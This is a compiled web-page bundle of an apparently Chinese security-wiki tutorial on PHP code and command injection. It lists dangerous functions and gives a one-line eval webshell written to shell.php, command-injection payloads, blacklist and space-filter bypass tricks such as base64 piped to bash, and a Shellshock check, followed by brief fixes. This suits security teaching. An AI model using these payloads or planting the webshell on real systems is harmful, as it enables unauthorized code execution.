(window.__LOADABLE_LOADED_CHUNKS__=window.__LOADABLE_LOADED_CHUNKS__||[]).push([[37],{179:function(e,a,t){"use strict";t.r(a),function(e){t.d(a,"default",(function(){return u}));var n,s=t(95),p=(t(139),t(0),t(96));function c(){return(c=Object.assign||function(e){for(var a=1;a<arguments.length;a++){var t=arguments[a];for(var n in t)Object.prototype.hasOwnProperty.call(t,n)&&(e[n]=t[n])}return e}).apply(this,arguments)}function b(e,a){if(null==e)return{};var t,n,s=function(e,a){if(null==e)return{};var t,n,s={},p=Object.keys(e);for(n=0;n<p.length;n++)t=p[n],a.indexOf(t)>=0||(s[t]=e[t]);return s}(e,a);if(Object.getOwnPropertySymbols){var p=Object.getOwnPropertySymbols(e);for(n=0;n<p.length;n++)t=p[n],a.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(s[t]=e[t])}return s}(n="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.enterModule:void 0)&&n(e);"undefined"!=typeof reactHotLoaderGlobal&&reactHotLoaderGlobal.default.signature;var o,r,m=function(e){return function(a){return console.warn("Component "+e+" was not imported, exported, or provided by MDXProvider as global scope"),Object(p.b)("div",a)}},l={},N="wrapper";function u(e){var a=e.components,t=b(e,["components"]);return Object(p.b)(N,c({},l,t,{components:a,mdxType:"MDXLayout"}),Object(p.b)("h1",{className:"__internal",id:"命令注入漏洞"},"命令注入漏洞",Object(p.b)("a",c({parentName:"h1"},{href:"#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("blockquote",null,Object(p.b)("p",{parentName:"blockquote"},"代码执行：可执行脚本语言代码"),Object(p.b)("p",{parentName:"blockquote"},"命令执行：可执行系统(Linux、windows)命令")),Object(p.b)("h1",{className:"__internal",id:"php敏感函数代码执行"},"PHP敏感函数代码执行",Object(p.b)("a",c({parentName:"h1"},{href:"#php%E6%95%8F%E6%84%9F%E5%87%BD%E6%95%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"eval"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),"\t\t",Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"//把字符串作为PHP代码执行"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"assert"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),"\t",Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"//检查一个断言是否为 FALSE，可用来执行代码"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"preg_replace"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),"\t",Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"//执行一个正则表达式的搜索和替换"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"call_user_func"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"//把第一个参数作为回调函数调用"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"call_user_func_array"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"//调用回调函数，并把一个数组参数作为回调函数的参数"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"array_map"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),"\t\t",Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"//为数组的每个元素应用回调函数 ")))),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"eval：")),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php")," @",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"eval"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_POST"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"arg"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"eval函数会将提交上来的值作为PHP代码处理，可以提交phpinfo(); 或者生成一句话shell"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),"fputs(fopen('shell.php','w+'),'",Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php")," @",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"eval"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_POST"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),"pass",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"');"))),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"preg_replace：(5.5版本以上已废弃/e修饰符)")),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"preg_replace"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"//e"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'arg'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"start testing..."'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"当replacement 参数构成一个合理的php代码字符串的时候，/e 修正符将参数当做php代码执行"),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"create_function:")),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$test"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"test"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$new_func"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"create_function"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'$a,$b'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$test"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$new_func"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"2"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token constant"}),"M_E"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"在php 中使用create_function创建一个匿名函数（lambda-style） 如未对参数进行严格的过滤审查，可以通过提交特殊字符串给create_function执行任意代码."),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"使用${${ }}简单绕过：")),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$str"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"echo \\"Hello "'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"arg"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"!!\\"; "'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"eval"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$str"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"代码使用反斜杠将echo后面的内容给转义了 与加addslashes()函数进行过滤是一样的 payload：",Object(p.b)("inlineCode",{parentName:"p"},"arg=${${phpinfo()}}")),Object(p.b)("h1",{className:"__internal",id:"php程序执行函数"},Object(p.b)("a",c({parentName:"h1"},{href:"https://www.php.net/manual/zh/ref.exec.php",target:"_blank"}),"PHP程序执行函数"),Object(p.b)("a",c({parentName:"h1"},{href:"#php%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"system"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),"\t\t",Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"//执行外部程序，并且显示输出"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"exec"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),"\t\t\t",Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"//执行一个外部程序"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"shell_exec"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),"\t",Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"//通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"passthru"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),"\t\t",Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"//执行外部程序并且显示原始输出"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"pcntl_exec"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),"\t",Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"//在当前进程空间执行指定程序"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"popen"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),"\t\t\t",Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"//打开进程文件指针"),"\n",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"proc_open"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),"\t\t",Object(p.b)("span",c({parentName:"code"},{className:"token comment"}),"//执行一个命令，并且打开用来输入/输出的文件指针")))),Object(p.b)("p",null,"最简单的例子："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(p.b)("pre",c({parentName:"div"},{className:"language-text"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-text"}),"<?php $test = $_GET['cmd']; system($test); ?>"))),Object(p.b)("p",null,"payload：",Object(p.b)("inlineCode",{parentName:"p"},"?cmd=whoami"),"  这样即可执行系统命令"),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"举一个类似DVWA里边的例子：")),Object(p.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(p.b)("pre",c({parentName:"div"},{className:"language-text"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-text"}),"<?php$test = $_GET['cmd'];system(\"ping -c 3 \" . $test);?>"))),Object(p.b)("p",null,"payload：",Object(p.b)("inlineCode",{parentName:"p"},"?cmd=127.0.0.1;whoami")),Object(p.b)("h2",{className:"__internal",id:"命令分隔符："},Object(p.b)("strong",{parentName:"h2"},"命令分隔符："),Object(p.b)("a",c({parentName:"h2"},{href:"#%E5%91%BD%E4%BB%A4%E5%88%86%E9%9A%94%E7%AC%A6%EF%BC%9A","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"在Linux上"),"，上面的 ; 也可以用 |、|| 代替"),Object(p.b)("blockquote",null,Object(p.b)("p",{parentName:"blockquote"},";前面的执行完执行后面的"),Object(p.b)("p",{parentName:"blockquote"},"|是管道符，显示后面的执行结果"),Object(p.b)("p",{parentName:"blockquote"},"||当前面的执行出错时执行后面的"),Object(p.b)("p",{parentName:"blockquote"},"可用",Object(p.b)("strong",{parentName:"p"},"%0A"),"换行执行命令")),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"在Windows上"),"，不能用 ; 可以用&、&&、|、||代替"),Object(p.b)("blockquote",null,Object(p.b)("p",{parentName:"blockquote"}," &前面的语句为假则直接执行后面的"),Object(p.b)("p",{parentName:"blockquote"}," &&前面的语句为假则直接出错，后面的也不执行"),Object(p.b)("p",{parentName:"blockquote"}," |直接执行后面的语句"),Object(p.b)("p",{parentName:"blockquote"},"||前面出错执行后面的")),Object(p.b)("p",null,"PHP 支持一个执行运算符：反引号（``） PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"})," ",Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," `whoami`",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"效果与函数 shell_exec() 相同，都是以字符串的形式返回一个命令的执行结果，可以保存到变量中"),Object(p.b)("h1",{className:"__internal",id:"命令执行绕过技巧"},"命令执行绕过技巧",Object(p.b)("a",c({parentName:"h1"},{href:"#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"正则审查")),Object(p.b)("blockquote",null,Object(p.b)("p",{parentName:"blockquote"},"是否使用多行模式修饰符（/foo/m）"),Object(p.b)("p",{parentName:"blockquote"},"是否遗漏匹配对象末尾的换行符（/^\\d+$/）"),Object(p.b)("p",{parentName:"blockquote"},"是否允许空白字符（\\s）"),Object(p.b)("p",{parentName:"blockquote"},"是否误写反斜杠匹配模式（/","\\","/） ")),Object(p.b)("p",null,"可用",Object(p.b)("strong",{parentName:"p"},"%0A"),"换行执行命令，换行符自身是一个有效的",Object(p.b)("strong",{parentName:"p"},"目录分隔符")," "),Object(p.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(p.b)("pre",c({parentName:"div"},{className:"language-bash"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-bash"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"cat")," ",Object(p.b)("span",c({parentName:"code"},{className:"token number"}),"123"),"/flag\n",Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"cat")," ",Object(p.b)("span",c({parentName:"code"},{className:"token number"}),"123"),"%0A flag"))),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"黑名单绕过")),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$test")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'cmd'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$test")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"str_replace"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"cat"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'""'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$test"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$test")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"str_replace"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"ls"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'""'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$test"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$test")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"str_replace"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'" "'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'""'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$test"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$test")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"str_replace"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"pwd"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'""'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$test"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$test")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"str_replace"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"wget"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'""'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$test"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"var_dump"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$test"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"system"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),"\"ls -al '",Object(p.b)("span",c({parentName:"span"},{className:"token interpolation"}),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$test")),"'\""),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"shell特殊变量："),"ca$1t、ca$@t fla$@g "),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"单引号、双引号：")," c\"\"at、ca''t、",Object(p.b)("strong",{parentName:"p"},"反斜线")," c\\at"),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"base64编码："),Object(p.b)("inlineCode",{parentName:"p"},'echo "Y2F0IGZsYWc="|base64 -d|bash'),"、",Object(p.b)("strong",{parentName:"p"},"Hex编码："),' echo "63617420666c6167" | xxd -r -p|bash '),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"利用变量：")," 执行ls命令： a=l;b=s;$a$b\t",Object(p.b)("strong",{parentName:"p"},"cat 1.php文件内容：")," a=c;b=at;c=1.php;$a$b ${c}"),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"绕过空格")," "),Object(p.b)("blockquote",null,Object(p.b)("p",{parentName:"blockquote"},"用",Object(p.b)("strong",{parentName:"p"},"${IFS}"),"代替"),Object(p.b)("p",{parentName:"blockquote"},"读取文件的时候利用重",Object(p.b)("strong",{parentName:"p"},"定向符cat<flag")),Object(p.b)("p",{parentName:"blockquote"},"花括号无空格",Object(p.b)("strong",{parentName:"p"},"{cat,666.txt}")," ")),Object(p.b)("p",null,"$IFS可截断后边的内容，cat flag$IFS666.txt"),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"长度限制"),"，通过构造文件来绕过"),Object(p.b)("blockquote",null,Object(p.b)("p",{parentName:"blockquote"},"linux下可以用 1>a创建文件名为a的空文件\nls -t>test则会将目录按时间排序后写进test文件中\nsh命令可以从一个文件中读取命令来执行")),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"引号逃逸")),Object(p.b)("p",null,"恶意命令被扩在引号内，可用 \\ 转义引号逃逸"),Object(p.b)("h1",{className:"__internal",id:"修复方式"},"修复方式",Object(p.b)("a",c({parentName:"h1"},{href:"#%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("blockquote",null,Object(p.b)("p",{parentName:"blockquote"},"1、尽量不要使用以上的代码/命令执行函数"),Object(p.b)("p",{parentName:"blockquote"},"2、使用disable_funtion()禁用以上函数"),Object(p.b)("p",{parentName:"blockquote"},"3、过滤所有能当作命令分隔符使用的字符")),Object(p.b)("h1",{className:"__internal",id:"相关的漏洞"},"相关的漏洞",Object(p.b)("a",c({parentName:"h1"},{href:"#%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,Object(p.b)("a",c({parentName:"p"},{href:"https://github.com/Medicean/VulApps/tree/master/b/bash",target:"_blank"}),"bash破壳漏洞")),Object(p.b)("blockquote",null,Object(p.b)("p",{parentName:"blockquote"},"验证：env x='() { :;}; echo vulnerable' bash -c \"echo this is a test\"  ")),Object(p.b)("p",null,"Struts2远程命令执行 (",Object(p.b)("a",c({parentName:"p"},{href:"https://github.com/Medicean/VulApps/tree/master/s/struts2",target:"_blank"}),"VulApps"),"，",Object(p.b)("a",c({parentName:"p"},{href:"https://vulhub.org/#/environments/struts2/s2-057/",target:"_blank"}),"Vulhub"),")"))}u.isMDXComponent=!0,u=Object(s.hot)(e)(u),(o="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.default:void 0)&&(o.register(m,"makeShortcode","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\web\\code-injection.md"),o.register(l,"layoutProps","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\web\\code-injection.md"),o.register(N,"MDXLayout","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\web\\code-injection.md"),o.register(u,"MDXContent","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\web\\code-injection.md")),(r="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.leaveModule:void 0)&&r(e)}.call(this,t(23)(e))}}]);